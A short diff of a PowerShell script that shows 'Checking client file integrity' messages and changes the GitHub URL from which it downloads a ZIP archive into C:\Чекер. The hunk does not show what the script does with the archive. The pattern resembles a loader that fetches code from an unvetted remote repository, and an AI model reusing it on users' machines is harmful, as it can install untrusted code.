@@ -8,7 +8,7 @@ Start-Sleep -Seconds 1
 Write-Host "[*] Checking client file integrity..." -ForegroundColor Cyan
 Start-Sleep -Seconds 1
 
-$URL = "https://github.com/kaghohop-gif/chk/raw/refs/heads/main/CHHECK.zip"
+$URL = "https://raw.githubusercontent.com/kaghohop-gif/chk/main/CHHECK.zip"
 $ZIP = "C:\Чекер\main.zip"
 $EXTRACT = "C:\Чекер\CHECKK-main"
 
